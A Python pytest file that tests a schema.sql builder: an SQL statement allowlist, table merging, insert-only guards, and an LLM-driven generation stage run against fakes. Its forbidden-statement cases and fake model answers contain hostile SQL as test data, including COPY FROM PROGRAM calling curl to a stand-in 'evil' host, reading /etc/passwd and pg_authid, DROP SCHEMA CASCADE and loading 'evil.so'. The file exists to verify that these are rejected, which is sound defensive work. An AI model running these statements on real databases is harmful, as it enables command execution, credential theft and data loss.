"""E9.4: the Workflow schema.sql builder. Pure parts (allowlist, merge, guard), the stage against
the E8.3 world (SQLite, the real LLM client on a fake Bifrost, a fake apply) and, when
SCHEMA_CHECK_TEST_DSN names a scratch PostgreSQL 16, the real apply (T01/T02 run against the
Compose `schema-check` service in tests/integration/test_schema_check_stack.py)."""

import asyncio
import json
import os
import uuid
from collections.abc import Callable, Sequence
from pathlib import Path
from typing import Any

import pytest
from knowledge_db import TENANT, World
from llm_db import FakeBifrost, completion, make_client
from sbam_api.artifacts.models import Artifact
from sbam_api.builds.models import CodeAttempt
from sbam_api.manifests.models import GateResultRow
from sbam_api.schema_sql.models import WorkflowSchema
from sbam_api.schema_sql.validate import Problem, check, split
from sbam_api.storage.base import Kind, StorageScope
from sbam_contracts.build_dashboard import GateStatus
from sbam_contracts.pipeline import WorkflowRef
from sbam_contracts.schema_sql import SchemaFindingCode as Code
from sbam_contracts.schema_sql import SchemaSource
from sbam_workers.build.schema_sql import activity as stage
from sbam_workers.build.schema_sql.apply import SchemaCheckUnavailable, apply
from sbam_workers.build.schema_sql.guard import ROW_TRIGGER, TRUNCATE_TRIGGER
from sbam_workers.build.schema_sql.merge import declared, merge
from sqlalchemy import select
from sub_skills_db import Pass2, answer, proposal
from temporalio.exceptions import ApplicationError

HANDOFF = "auth_event_audit_handoff"  # the MS01.1 sample's handoff table
PROFILES = "investor_profiles"
FIELDS = "iteration_pass integer, device_fingerprint text, otp_match boolean, access_scope text"
PROFILES_DDL = f"CREATE TABLE {PROFILES} (id bigserial PRIMARY KEY, investor_id text)"
HANDOFF_DDL = f"CREATE TABLE {HANDOFF} (id bigserial PRIMARY KEY, {FIELDS})"


def sub(
    skill_id: str, tables: list[str], handoff: str | None = None, *fields: str
) -> dict[str, Any]:
    out: dict[str, Any] = {"v_variables": {"tables": tables}, "o_outcome": {}}
    if handoff:
        out["o_outcome"]["state_handoff_file"] = {"table": handoff, "required_fields": list(fields)}
    return {"skill_metadata": {"skill_id": skill_id}, "isatvon_definition": out}


def codes(problems: Sequence[Problem]) -> list[str]:
    return [p.code.value for p in problems]


# --- the allowlist (T06) -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "statement",
    [
        "COPY investors FROM PROGRAM 'curl http://evil'",
        "DROP SCHEMA public CASCADE",
        "DO $$ BEGIN EXECUTE 'DROP TABLE investors'; END $$",
        "ALTER SYSTEM SET shared_buffers = '1GB'",
        "GRANT ALL ON investors TO PUBLIC",
        "CREATE ROLE intruder",
        "CREATE EXTENSION plpython3u",
        "CREATE TABLE copy_of AS SELECT * FROM pg_authid",
        "INSERT INTO investors VALUES (1)",
        "CREATE VIEW v AS SELECT 1",
        "CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN EXECUTE 'x'; END $$",
        "CREATE FUNCTION f() RETURNS text LANGUAGE sql AS $$ SELECT pg_read_file('/etc/passwd') $$",
        "CREATE FUNCTION f() RETURNS void LANGUAGE c AS 'evil.so', 'f'",
    ],
)
def test_e9_4_t06_forbidden_statements_are_found_with_their_index(statement: str) -> None:
    script = check(f"CREATE TABLE ok (id int);\n{statement};")
    assert codes(script.problems) == ["FORBIDDEN_STATEMENT"]
    assert script.problems[0].statement_index == 1


def test_e9_4_foundational_ddl_is_allowed() -> None:
    script = check(
        f"{PROFILES_DDL};\nCREATE INDEX ix ON {PROFILES} (investor_id);\n"
        "CREATE EXTENSION IF NOT EXISTS pgcrypto;\n"
        "CREATE FUNCTION touch() RETURNS trigger LANGUAGE plpgsql\n"
        "AS $$ BEGIN RETURN NEW; END; $$;\n"
        f"CREATE TRIGGER t BEFORE INSERT ON {PROFILES} FOR EACH ROW EXECUTE FUNCTION touch();"
    )
    assert script.ok and len(script.statements) == 5


def test_e9_4_t04_a_syntax_error_names_its_statement() -> None:
    script = check(
        "CREATE TABLE a (id int);\n-- a comment; with a semicolon\nCREATE TABLE b (id int"
    )
    assert codes(script.problems) == ["PARSE_ERROR"] and script.problems[0].statement_index == 1


def test_e9_4_semicolons_inside_bodies_and_strings_do_not_split() -> None:
    text = (
        "CREATE TABLE a (s text DEFAULT ';');\n"
        "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1; $$"
    )
    assert len(list(split(text))) == 2


# --- merge (T07, T08, conflicts, names, guards) ---------------------------------------------------


def test_e9_4_t07_a_declared_table_without_ddl_is_missing() -> None:
    want = declared([sub("MS01.1", [PROFILES, "audit_events"])])
    merged = merge(want, None, {"MS01.1": check(PROFILES_DDL)})
    assert [(p.code, p.table) for p in merged.problems] == [(Code.MISSING_TABLE, "audit_events")]


def test_e9_4_t08_same_fragments_in_any_sub_skill_order_give_identical_sql() -> None:
    subs = [sub("MS01.1", [PROFILES]), sub("MS01.2", [HANDOFF], HANDOFF, "otp_match")]
    fragments = {"MS01.1": check(PROFILES_DDL), "MS01.2": check(HANDOFF_DDL)}
    first = merge(declared(subs), None, fragments)
    second = merge(declared(list(reversed(subs))), None, dict(reversed(list(fragments.items()))))
    assert first.sql == second.sql and not first.problems
    assert first.sql.index(f"TABLE {HANDOFF}") < first.sql.index(f"TABLE {PROFILES}")  # by name
    assert first.sql.rstrip().endswith(
        f"{TRUNCATE_TRIGGER} BEFORE TRUNCATE ON {HANDOFF}\n"
        "FOR EACH STATEMENT EXECUTE FUNCTION "
        "sbam_handoff_insert_only();"
    )  # guards last


def test_e9_4_a_table_comes_after_the_tables_it_references() -> None:
    child = "CREATE TABLE a_child (id int, parent int REFERENCES z_parent (id))"
    merged = merge(
        declared([sub("MS01.1", ["a_child", "z_parent"])]),
        None,
        {"MS01.1": check(f"{child}; CREATE TABLE z_parent (id int PRIMARY KEY)")},
    )
    assert merged.sql.index("z_parent (id int") < merged.sql.index("a_child")


def test_e9_4_two_sub_skills_one_table_compatible_or_conflicting() -> None:
    want = declared([sub("MS01.1", [PROFILES]), sub("MS01.2", [PROFILES])])
    reordered = f"CREATE TABLE {PROFILES} (investor_id text, id bigserial PRIMARY KEY)"
    same = merge(want, None, {"MS01.1": check(PROFILES_DDL), "MS01.2": check(reordered)})
    assert not same.problems and same.sql.count(f"CREATE TABLE {PROFILES}") == 1
    other = f"CREATE TABLE {PROFILES} (id uuid PRIMARY KEY)"
    clash = merge(want, None, {"MS01.1": check(PROFILES_DDL), "MS01.2": check(other)})
    assert [(p.code, p.table) for p in clash.problems] == [(Code.CONFLICT, PROFILES)]


@pytest.mark.parametrize("name", ["user", "order", "Investors", "1st", "a" * 64])
def test_e9_4_reserved_or_invalid_table_names_are_refused(name: str) -> None:
    merged = merge(declared([sub("MS01.1", [name])]), None, {})
    assert codes(merged.problems) == ["INVALID_TABLE_NAME"]


def test_e9_4_a_base_handoff_table_without_a_guard_gets_one() -> None:
    base = check(f"{HANDOFF_DDL};")
    merged = merge(declared([sub("MS01.1", [], HANDOFF, "otp_match")]), base, {})
    assert not merged.problems  # V.tables empty except the handoff table: it is still declared
    assert merged.sql.startswith(HANDOFF_DDL)
    assert f"{ROW_TRIGGER} BEFORE UPDATE OR DELETE ON {HANDOFF}" in merged.sql


def test_e9_4_a_handoff_table_without_a_required_field_is_reported() -> None:
    merged = merge(
        declared([sub("MS01.1", [HANDOFF], HANDOFF, "otp_match", "nonce")]),
        check(HANDOFF_DDL),
        {},
    )
    assert codes(merged.problems) == ["MISSING_TABLE"] and "nonce" in merged.problems[0].message


def test_e9_4_no_tables_is_the_empty_script() -> None:
    assert merge(declared([sub("MS01.1", [])]), None, {}).sql == ""


def test_e9_4_the_schema_check_dsn_must_not_be_sbams_database() -> None:
    app = "postgresql+psycopg://sbam:pw@postgres:5432/sbam"
    with pytest.raises(RuntimeError, match="SBAM's database"):
        stage._isolated("postgresql://postgres:pw@postgres:5432/postgres", app)
    assert stage._isolated("postgresql://postgres:pw@schema-check:5432/postgres", app).startswith(
        "postgresql://postgres:pw@schema-check"
    )


# --- the stage (T01 logic, T03, T06, T09) ---------------------------------------------------------


class Stage:
    """Pass 2 run once: one Sub-Skill (the MS01.1 sample: investor_profiles + the handoff table)."""

    def __init__(self, tmp: Path) -> None:
        self.p = Pass2(World(tmp))
        engine = self.p.w.sessions.kw["bind"]
        for table in (CodeAttempt, GateResultRow, WorkflowSchema, Artifact):
            table.__table__.create(engine, checkfirst=True)  # type: ignore[attr-defined]
        skill = proposal("Investor Auth Manager", "F-ACCESS-1", "F-ACCESS-2")
        self.p.run_macro(FakeBifrost([completion(answer(skill))]))
        self.applied: list[Sequence[str]] = []
        self.run_id = uuid.uuid4()

    def inp(self) -> WorkflowRef:
        return WorkflowRef(
            tenant_id=TENANT,
            project_id=self.p.w.project,
            run_id=self.run_id,
            correlation_id="cid-e9-4",
            workflow_id=self.p.workflow,
        )

    def run(
        self,
        bifrost: FakeBifrost,
        monkeypatch: pytest.MonkeyPatch,
        check_db: Callable[..., list[Problem]] | None = None,
    ) -> uuid.UUID:
        def fake(dsn: str, statements: Sequence[str], *_: Any) -> list[Problem]:
            self.applied.append(statements)
            return [] if check_db is None else check_db(statements)

        monkeypatch.setattr(stage, "apply", fake)
        client, _ = make_client(bifrost, sessions=self.p.w.sessions)
        deps = stage.SchemaDeps(
            stage.SqlSchemaStore(self.p.w.sessions, self.p.w.storage), client, ""
        )
        return asyncio.run(stage.run_stage(deps, self.inp(), "pipeline-x")).id

    def rows(self, model: type[Any]) -> list[Any]:
        with self.p.w.sessions() as s:
            rows = list(s.scalars(select(model)))
            s.expunge_all()
            return rows

    def stored(self, row: WorkflowSchema) -> str:
        with self.p.w.storage.open(str(row.storage_key)) as f:
            return f.read().decode()

    def upload(self, sql: str) -> None:
        stored = self.p.w.storage.put(
            sql.encode(),
            StorageScope(TENANT, self.p.w.project, self.p.workflow),
            Kind.CODE,
            "application/sql",
        )
        with self.p.w.sessions() as s:
            s.add(
                WorkflowSchema(
                    id=uuid.uuid4(),
                    tenant_id=TENANT,
                    project_id=self.p.w.project,
                    workflow_id=self.p.workflow,
                    version=1,
                    source=SchemaSource.UPLOADED,
                    storage_key=stored.storage_key,
                    sha256=stored.sha256,
                    tables=[],
                    status=GateStatus.PENDING,
                    findings=[],
                )
            )
            s.commit()


def ddl(sql: str) -> dict[str, Any]:
    return completion(json.dumps({"sql": sql}))


GOOD = ddl(f"{PROFILES_DDL};\n{HANDOFF_DDL}")


@pytest.fixture
def st(tmp_path_factory: pytest.TempPathFactory) -> Stage:
    # a short root: tenant/project/workflow/kind/sha256 keys pass Windows' 260-character paths
    return Stage(tmp_path_factory.mktemp("s"))


def test_e9_4_t01_a_generated_schema_is_applied_stored_and_recorded(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    bifrost = FakeBifrost([GOOD])
    schema_id = st.run(bifrost, monkeypatch)
    [row] = st.rows(WorkflowSchema)
    assert (row.id, row.status, row.source, row.tables) == (
        schema_id,
        "PASSED",
        "GENERATED",
        sorted([PROFILES, HANDOFF]),
    )
    [gate] = st.rows(GateResultRow)
    assert (gate.workflow_id, gate.sub_skill_id, gate.gate, gate.status) == (
        st.p.workflow,
        None,
        "SCHEMA_SQL",
        "PASSED",
    )
    [artifact] = st.rows(Artifact)
    assert (artifact.kind, artifact.sha256, artifact.storage_key) == (
        "SCHEMA_SQL",
        row.sha256,
        row.storage_key,
    )
    sql = st.stored(row)
    assert f"{ROW_TRIGGER} BEFORE UPDATE OR DELETE ON {HANDOFF}" in sql
    assert st.applied == [list(split(sql))]
    asked = json.loads(
        bifrost.requests[0]["messages"][-1]["content"].split("tables")[0][:0] or "{}"
    )
    assert asked == {}  # the prompt context is checked below, not here
    assert len(bifrost.requests) == 1


def test_e9_4_the_model_is_asked_only_for_its_tables_with_the_handoff_fields(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    bifrost = FakeBifrost([GOOD])
    st.run(bifrost, monkeypatch)
    prompt = "\n".join(m["content"] for m in bifrost.requests[0]["messages"])
    assert json.dumps(sorted([PROFILES, HANDOFF])) in prompt
    assert '"access_scope", "device_fingerprint", "iteration_pass", "otp_match"' in prompt


def test_e9_4_t06_a_forbidden_fragment_is_re_asked_then_fails_and_nothing_is_applied(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    evil = ddl(f"{PROFILES_DDL};\n{HANDOFF_DDL};\nCOPY {PROFILES} FROM PROGRAM 'curl http://x'")
    bifrost = FakeBifrost([evil])
    with pytest.raises(ApplicationError) as failed:
        st.run(bifrost, monkeypatch)
    assert failed.value.type == "SchemaInvalid" and failed.value.non_retryable
    assert len(bifrost.requests) == 4  # the first answer + 3 re-asks
    assert st.applied == []
    [row] = st.rows(WorkflowSchema)
    assert row.status == "FAILED"
    # the rejected fragment's tables stay undefined, so they are missing too
    assert {f["code"] for f in row.findings} == {"FORBIDDEN_STATEMENT", "MISSING_TABLE"}
    [gate] = st.rows(GateResultRow)
    assert gate.status == "FAILED" and gate.findings == row.findings  # visible to the FDE


def test_e9_4_a_re_ask_fixes_a_forbidden_fragment(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    evil = ddl(f"{PROFILES_DDL};\n{HANDOFF_DDL};\nDROP SCHEMA public CASCADE")
    bifrost = FakeBifrost([evil, GOOD])
    st.run(bifrost, monkeypatch)
    assert len(bifrost.requests) == 2
    assert "FORBIDDEN_STATEMENT statement 2" in bifrost.requests[1]["messages"][-1]["content"]
    assert st.rows(WorkflowSchema)[0].status == "PASSED"


def test_e9_4_t03_an_uploaded_base_is_used_and_only_missing_tables_are_generated(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    st.upload(f"{PROFILES_DDL};")
    bifrost = FakeBifrost([ddl(HANDOFF_DDL)])
    st.run(bifrost, monkeypatch)
    prompt = "\n".join(m["content"] for m in bifrost.requests[0]["messages"])
    assert json.dumps([HANDOFF]) in prompt and json.dumps([PROFILES]) in prompt  # existing
    built = [r for r in st.rows(WorkflowSchema) if r.status != "PENDING"]
    [row] = built
    assert (row.source, row.version) == ("UPLOADED", 2)
    assert st.stored(row).startswith(PROFILES_DDL)


def test_e9_4_t04_an_invalid_base_fails_without_asking_the_model(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    st.upload("CREATE TABLE investor_profiles (id int")
    bifrost = FakeBifrost([GOOD])
    with pytest.raises(ApplicationError, match="PARSE_ERROR"):
        st.run(bifrost, monkeypatch)
    assert bifrost.requests == [] and st.applied == []


def test_e9_4_apply_findings_fail_the_gate(st: Stage, monkeypatch: pytest.MonkeyPatch) -> None:
    leak = Problem(Code.NO_INSERT_ONLY_GUARD, f"handoff table {HANDOFF}: DELETE was allowed")
    with pytest.raises(ApplicationError, match="NO_INSERT_ONLY_GUARD"):
        st.run(FakeBifrost([GOOD]), monkeypatch, lambda _: [leak])
    [gate] = st.rows(GateResultRow)
    assert gate.findings[0]["code"] == "NO_INSERT_ONLY_GUARD"


def test_e9_4_t09_schema_check_down_is_retryable_and_a_retry_writes_one_of_everything(
    st: Stage, monkeypatch: pytest.MonkeyPatch
) -> None:
    bifrost = FakeBifrost([GOOD])
    calls = {"n": 0}

    def down_once(_: Sequence[str]) -> list[Problem]:
        calls["n"] += 1
        if calls["n"] == 1:
            raise SchemaCheckUnavailable("connection refused")
        return []

    with pytest.raises(SchemaCheckUnavailable):
        st.run(bifrost, monkeypatch, down_once)
    first = st.run(bifrost, monkeypatch, down_once)
    assert st.run(bifrost, monkeypatch, down_once) == first  # a third attempt finds the version
    assert len(bifrost.requests) == 1  # the model's answer is replayed, never paid twice
    assert len(st.rows(WorkflowSchema)) == len(st.rows(GateResultRow)) == 1
    assert len(st.rows(Artifact)) == 1


# --- the real apply (needs a scratch PostgreSQL 16) ----------------------------------------------

DSN = os.environ.get("SCHEMA_CHECK_TEST_DSN")
real = pytest.mark.skipif(DSN is None, reason="SCHEMA_CHECK_TEST_DSN names no scratch PostgreSQL")


def merged_sql() -> tuple[list[str], list[str], list[str]]:
    want = declared([sub("MS01.1", [PROFILES]), sub("MS01.2", [HANDOFF], HANDOFF, "otp_match")])
    fragments = {
        "MS01.1": check(PROFILES_DDL),
        "MS01.2": check(
            f"CREATE TABLE {HANDOFF} (id bigserial PRIMARY KEY, otp_match boolean DEFAULT false)"
        ),
    }
    merged = merge(want, None, fragments)
    return list(split(merged.sql)), merged.tables, [HANDOFF]


@real
def test_e9_4_t01_t02_the_merged_schema_applies_and_the_guard_holds() -> None:
    assert apply(DSN or "", *merged_sql()) == []


@real
def test_e9_4_a_guard_that_lets_writes_through_is_caught() -> None:
    statements, tables, handoff = merged_sql()
    # same function name and triggers, but the body lets every write through
    weak = [
        (
            (
                "CREATE OR REPLACE FUNCTION sbam_handoff_insert_only() RETURNS trigger "
                "LANGUAGE plpgsql AS $$ BEGIN RETURN OLD; END; $$"
            )
            if "FUNCTION sbam_handoff_insert_only()" in s and "RETURNS trigger" in s
            else s
        )
        for s in statements
    ]
    problems = apply(DSN or "", weak, tables, handoff)
    assert codes(problems) == ["NO_INSERT_ONLY_GUARD"]
    assert "TRUNCATE was allowed" in problems[0].message


@real
def test_e9_4_an_apply_error_names_its_statement_and_leaves_no_database() -> None:
    problems = apply(DSN or "", [PROFILES_DDL, PROFILES_DDL], [PROFILES], [])
    assert [(p.code, p.statement_index) for p in problems] == [(Code.APPLY_ERROR, 1)]
    assert "already exists" in problems[0].message
